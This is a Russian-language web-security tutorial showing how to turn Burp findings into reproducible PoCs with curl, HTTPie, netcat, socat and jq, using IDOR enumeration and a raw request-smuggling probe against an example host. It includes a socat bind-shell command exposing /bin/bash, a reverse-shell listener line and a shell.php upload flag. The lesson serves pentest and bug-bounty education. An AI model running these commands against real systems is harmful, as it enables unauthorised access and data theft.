## Вопрос, с которого всё начинается

Ты нашёл в Burp интересный запрос: чужой заказ открывается с твоей сессией. В отчёте нельзя написать «я потыкал в прокси» — нужна команда, которая воспроизводит баг у любого проверяющего. Как превратить «нашёл мышкой» в воспроизводимый PoC?

Ответ — консольные инструменты. То, что воспроизводится одной командой, становится доказательством. Разберём пять: `curl`, `HTTPie`, `netcat`, `socat` и `jq`.

## Наш пример

В Burp Repeater мы видим запрос: `GET https://shop.t/api/orders/1002` с заголовком `Cookie: session=abc123`. В ответе — данные **чужого** пользователя. Перенесём это в терминал и докажем.

Правило работы: **Burp — чтобы найти, curl — чтобы доказать**. В Burp правый клик → *Copy as cURL* — и запрос превращается в команду.

## Шаг 1: curl — воспроизводим точный запрос

`curl` — HTTP-клиент, который даёт полный контроль над байтами запроса.

```
$ curl -s 'https://shop.t/api/orders/1002' -H 'Cookie: session=abc123' | jq '.user_id, .total'
"user_57"
"1299.00"
```

Флаг `-s` («тихо») убирает прогресс-бар, `-H` добавляет заголовок. Проверим, что это действительно чужой объект — откроем свой (1001):

```
$ curl -s 'https://shop.t/api/orders/1001' -H 'Cookie: session=abc123' | jq '.user_id'
"me"
```

Один и тот же запрос, разный `id` — разный владелец. Это и есть **IDOR** (небезопасная прямая ссылка на объект): сервер не проверяет, что объект принадлежит тебе.

> `jq` — фильтр для JSON. Выражение `'.user_id'` вытаскивает поле из ответа. Без него пришлось бы читать глазами или писать `grep`.

Основные флаги curl:

| Флаг | Что делает |
|------|-----------|
| `-s/-S` | тихо / показать ошибку |
| `-i/-I` | заголовки+тело / только заголовки |
| `-X` | метод (`-X DELETE`) |
| `-d` | тело запроса (POST) |
| `-F` | multipart-форма (`-F file=@shell.php`) |
| `-b/-c` | отправить cookie / сохранить cookie-jar |
| `-u` | Basic auth |
| `-x` | прокси (Burp) |
| `-w` | шаблон вывода (`%{http_code}`) |
| `--path-as-is` | не схлопывать `../` |

## Шаг 2: HTTPie — читаемые ручные запросы

`http` (HTTPie) — тот же HTTP, но синтаксис приятнее: `ключ=значение` для поля формы, `ключ:=значение` для типизированного JSON, `ключ==значение` для query-параметра.

```
$ http GET https://shop.t/api/orders/1002 'Cookie: session=abc123'
HTTP/1.1 200 OK
Content-Type: application/json

{
    "id": 1002,
    "user_id": "user_57",
    "total": "1299.00"
}
```

Он показывает заголовки и раскрашивает JSON — удобно, когда нужно быстро «посмотреть глазами». Переберём соседние id в цикле:

```
$ for i in $(seq 1001 1005); do
    http --quiet GET https://shop.t/api/orders/$i 'Cookie: session=abc123' | jq -r '.user_id'
  done
me
user_57
user_13
user_13
user_88
```

Вот оно, доказательство объёмом: три чужих заказа одной строкой на каждый.

## Шаг 3: сессия, которую надо «носить»

Большинство багов живёт за аутентификацией, поэтому умение держать сессию в CLI критично. Лучший способ — **cookie-jar**: `-c` сохраняет все `Set-Cookie`, `-b` отправляет их обратно.

```
$ curl -s -c jar.txt -X POST https://shop.t/login -d 'user=admin&pass=admin' >/dev/null
$ curl -s -b jar.txt https://shop.t/dashboard | grep -i welcome
Welcome, admin
```

Если токен приходит в JSON, вытащим его через `jq -r` и подставим в следующий запрос:

```
$ TOKEN=$(curl -s -X POST https://shop.t/api/token -d 'u=admin&p=x' | jq -r '.access_token')
$ curl -s https://shop.t/api/me -H "Authorization: Bearer $TOKEN" | jq .
```

Частая ошибка новичка — копировать cookie вручную и забывать про срок жизни. Cookie-jar обновляет значения сам, и запросы остаются точной копией браузерных.

## Шаг 4: netcat — сырые байты на сокет

Иногда нужен полный контроль над запросом: `curl` нормализует его, а `nc` — нет. Проверим подозрение на **request smuggling** — рассинхронизацию, когда сервер и промежуточный прокси по-разному понимают, где кончается один запрос.

```
$ printf 'POST / HTTP/1.1\r\nHost: shop.t\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc -w3 shop.t 80
```

`nc` работает на уровне TCP: мы сами пишем `\r\n` (перевод строки в HTTP) и оба заголовка длины. Если сервер отвечает на «спрятанный» второй запрос — десинхронизация подтверждена.

| Флаг nc | Значение |
|---------|----------|
| `-l` | слушать |
| `-v` | подробно |
| `-n` | без DNS |
| `-p PORT` | локальный порт |
| `-z` | скан без данных |
| `-w SEC` | таймаут |

> **Listener** — процесс, который слушает порт и ждёт входящее соединение. `nc -lvnp 4444` — классический приёмник для обратного шелла. Всегда ставь `-w` при подключении, иначе `nc` может висеть вечно.

## Шаг 5: socat — форварды и туннели

`socat` — «netcat на стероидах»: адреса, SSL, форварды, несколько соединений.

```
$ socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80      # порт-форвард
$ socat - OPENSSL:shop.t:443,verify=0              # TLS-соединение
$ socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash   # шелл
```

`,fork` обязателен, если ждёшь больше одного клиента — иначе второй отвалится. `,reuseaddr` позволяет переиспользовать адрес сразу после закрытия.

## Что мы теперь знаем

- CLI даёт **воспроизводимость**: команда curl — это точное описание запроса.
- `curl -r`-стиль (`-H`, `-b`, `-d`) переносит cookie, тело и заголовки из Burp.
- `HTTPie` удобнее для ручного просмотра, `jq` — для разбора JSON.
- `netcat`/`socat` нужны, когда важны **сырые байты** (смуглинг) или **туннель**.
- Сессию носят cookie-jar'ом (`-c`/`-b`), а не копированием вручную.

## На что смотреть дальше

- **Нормализация пути.** curl по умолчанию схлопывает `../`; для traversal нужен `--path-as-is`.
- **DNS и Host.** `--resolve shop.t:443:10.0.0.5` подменяет DNS, сохраняя SNI и Host — нужно для vhost.
- **HTTP/2.** `--http2-prior-knowledge` для h2c; для смуглинга важен явный `--http1.1`.
- **`jq` и не-JSON.** Если ответ не JSON — `jq` упадёт; проверь Content-Type.
- **Burp против CLI.** Burp хорош для истории и перехвата, CLI — для автоматизации и CI, где GUI нет.

## Куда дальше

В следующем уроке мы возьмём `curl` и `jq` и применим их к разведке поверхности — как одной командой собрать эндпоинты, версии и заголовки. А пока главное запомни: **находи в Burp, доказывай в CLI** — и у тебя всегда будет воспроизводимый PoC.

## Где пригодится

- **CTF (Web):** воспроизвести чужой запрос, дёрнуть API и приложить одну понятную команду как PoC.
- **Bug bounty:** платформы требуют reproducible PoC — curl из Burp закрывает это в один шаг.
- **Пентест:** сессионная работа, загрузка файлов, отладка заголовков и сырые TCP-пробы.
- **Работа (AppSec/DevSecOps):** тестирование API в CI и ручная проверка вебхуков/сервисов без GUI.
